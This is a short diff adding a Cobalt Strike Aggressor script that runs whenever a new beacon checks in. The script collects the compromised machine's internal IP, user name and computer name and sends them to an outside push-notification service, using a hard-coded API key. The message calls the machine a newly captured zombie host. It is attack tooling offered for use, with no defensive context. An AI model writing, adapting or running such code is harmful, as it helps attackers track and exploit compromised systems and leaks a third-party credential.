@@ -1,0 +1,27 @@
+on beacon_initial {
+
+    sub http_get {
+        local('$output');
+        $url = [new java.net.URL: $1];
+        $stream = [$url openStream];
+        $handle = [SleepUtils getIOHandle: $stream, $null];
+
+        @content = readAll($handle);
+
+        foreach $line (@content) {
+            $output .= $line . "\r\n";
+        }
+
+        println($output);
+    }
+    #获取ip、计算机名、登录账号
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+
+    #get一下Server酱的链接
+    $url = 'https://sc.ftqq.com/SCU102352T6fdd6ca1049f90ca82ea18306345c2865eef2f0d196ee.send?text=%e6%82%a8%e6%9c%89%e6%96%b0%e7%9a%84%e8%82%89%e9%b8%a1%e4%b8%8a%e7%ba%bf%ef%bc%8c%e8%af%b7%e6%9f%a5%e6%94%b6%ef%bd%9e&desp=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92%0D%0A%0D%0Aip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;
+
+    http_get($url);
+
+}
